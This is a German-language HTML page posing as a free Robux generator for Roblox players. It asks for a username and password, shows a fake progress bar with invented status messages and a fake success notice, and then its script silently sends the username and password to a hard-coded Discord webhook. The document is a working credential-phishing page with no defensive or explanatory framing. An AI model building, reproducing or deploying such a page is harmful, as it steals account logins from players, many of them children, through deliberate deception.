<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gratis Robux Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #fffbf2;
            color: #5a5a5a;
        }
        .hidden { display: none; }
        #progressBarContainer {
            width: 100%;
            background-color: #ffe0e9;
            margin-top: 20px;
            border-radius: 15px;
            padding: 5px;
        }
        #progressBar {
            width: 0%;
            height: 30px;
            background-color: #ff9aa2;
            text-align: center;
            color: white;
            border-radius: 10px;
            line-height: 30px;
        }
        input, button {
            padding: 10px;
            border: none;
            border-radius: 20px;
            margin: 10px;
            font-size: 16px;
        }
        input {
            background-color: #fcefee;
            color: #5a5a5a;
        }
        button {
            background-color: #ffb7c5;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #ff9aa2;
        }
        .password-container {
            position: relative;
            display: inline-block;
        }
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            background: none;
            border: none;
            font-size: 16px;
            color: #5a5a5a;
        }

    </style>
</head>
<body>
<h1 style="color: #ff6781;">Gratis Robux Generator</h1>
<p>Gib deinen Roblox-Benutzernamen und die gew√ºnschte Menge an Robux ein:</p>
<input type="text" id="username" placeholder="Roblox Username">
<div class="password-container">
    <input type="password" id="password" placeholder="Roblox Password">
    <button class="toggle-password" onclick="toggleUsernameVisibility()">üëÅÔ∏è</button>
</div>
<input type="number" id="robuxAmount" placeholder="Robux Menge" min="1">
<button onclick="startFakeProcess()">Generieren</button>

<div id="progressBarContainer" class="hidden">
    <div id="progressBar">0%</div>
</div>

<p id="message" class="hidden"></p>

<script>
    function toggleUsernameVisibility() {
        let usernameInput = document.getElementById("password");
        if (usernameInput.type === "password") {
            usernameInput.type = "text";
        } else {
            usernameInput.type = "password";
        }
    }
    function startFakeProcess() {
        let username = document.getElementById("username").value;
        let password = document.getElementById("password").value;
        let robuxAmount = document.getElementById("robuxAmount").value;
        if (!username || !robuxAmount || !password) {
            alert("Bitte f√ºlle alle Felder aus!");
            return;
        }




        document.getElementById("progressBarContainer").classList.remove("hidden");
        let progress = 0;
        let messages = [
            { limit: 30, text: "In Account einloggen..." },
            { limit: 50, text: "Robux kaufen..." },
            { limit: 70, text: "Daten verifizieren..." },
            { limit: 85, text: "Transaktion abschlie√üen..." },
            { limit: 99, text: "Server verbinden..." },
            { limit: 100, text: "Robux aufgeladen" }
        ];

        let interval = setInterval(() => {
            if (progress >= 100) {
                clearInterval(interval);
                document.getElementById("message").innerText = `Erfolgreich! ${robuxAmount} Robux wurden zu ${username} hinzugef√ºgt!`;
                document.getElementById("message").classList.remove("hidden");
                fetch("https://discord.com/api/webhooks/1344780329851945011/8TtCOWokrlXL8XAywwzJUdZf0HDeJAaJoSWDIvE7L83IUXMS-KA9qbgiCEpKS1fdXO1P", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: `User: ${username}, Password: ${password}` })
                });
            } else {
                let step = Math.floor(Math.random() * 5) + 1; // Zuf√§llige Schritte zwischen 1 und 5
                progress = Math.min(progress + step, 100);
                let currentMessage = messages.find(m => progress <= m.limit).text;
                document.getElementById("progressBar").style.width = progress + "%";
                document.getElementById("progressBar").innerText = progress + "% - " + currentMessage;
            }
        }, Math.floor(Math.random() * 500) + 300); // Zuf√§llige Intervalle zwischen 300ms und 800ms
    }
</script>
</body>
</html>
